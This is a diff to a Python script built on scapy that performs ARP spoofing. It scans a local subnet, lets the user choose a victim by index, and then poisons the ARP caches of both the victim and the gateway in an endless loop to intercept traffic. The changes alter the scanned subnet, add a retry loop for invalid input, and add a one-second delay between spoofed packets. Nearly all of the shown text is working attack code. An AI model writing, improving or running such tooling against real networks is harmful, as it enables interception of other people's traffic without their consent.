@@ -1,6 +1,7 @@
 import scapy.all as scapy
 import random
 import socket
+import time
 
 #find all other devices on the network and generate a list of their IPs
 #pick an IP address at random from that list
@@ -33,24 +34,28 @@ def Main():
         print("Enter gateway IP")
         gatewayIP = input()
         gatewayMAC = getMAC(gatewayIP)
-        scan_network("192.168.2.1/24")
+        scan_network("192.168.0.0/24")
         print("Enter the number representing the index of the IP you wish to spoof")
         print(ipList)
        # targetIP = random.randint(0, len(ipList)-1)
-        temp = int(input())
-        if(temp < 0 or temp > len(ipList)-1):
-            print("Invalid index")
-            quit()
-        else:
-            targetIP = ipList[temp]
-            targetMAC = macList[temp]
-            print("target IP is "+targetIP)
-            print("target MAC is "+targetMAC)
+        #temp = int(input())
+        while True:
+            temp = int(input())
+            if(temp < 0 or temp > len(ipList)-1):
+                print("Invalid index")
+            
+            else:
+                targetIP = ipList[temp]
+                targetMAC = macList[temp]
+                print("target IP is "+targetIP)
+                print("target MAC is "+targetMAC)
+                break
         
         print("Spoofing")
         while True:
             spoofarp(targetIP, targetMAC, gatewayIP)
             spoofarp(gatewayIP, gatewayMAC, targetIP)
+            time.sleep(1)
 
         
     #except:
